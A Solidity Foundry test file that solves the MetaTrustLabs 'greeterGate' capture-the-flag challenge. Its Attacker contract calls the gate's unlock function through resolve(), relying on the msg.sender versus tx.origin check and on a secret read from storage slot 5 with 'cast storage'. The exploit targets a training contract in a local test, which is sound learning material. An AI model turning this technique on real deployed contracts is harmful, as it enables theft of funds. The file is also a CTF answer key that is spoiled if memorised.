// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./GreeterGate.sol";

/// https://github.com/MetaTrustLabs/ctf/blob/master/greeterGate/contracts/greeterGate.sol

/// @dev msg.sender != tx.origin
contract Attacker {
    Gate internal _gate;

    constructor(Gate gate_) {
        _gate = gate_;
    }

    function attack() public {
        // bytes16(_data) == bytes16(data[2])
        //
        // TODO: Gets the value of storage slot 5
        // cast storage {gate_contract_address} 5
        bytes memory data = abi.encode(bytes32(uint256(3)));
        _gate.resolve(abi.encodeWithSelector(Gate.unlock.selector, data));
    }
}

contract GreeterGateTest is Test {
    Gate internal _gate;

    function setUp() public {
        _gate = new Gate(bytes32(uint256(1)), bytes32(uint256(2)), bytes32(uint256(3)));
    }

    receive() external payable {}

    function test_attack() public {
        Attacker attacker = new Attacker(_gate);
        attacker.attack();

        assertTrue(_gate.isSolved());
    }
}
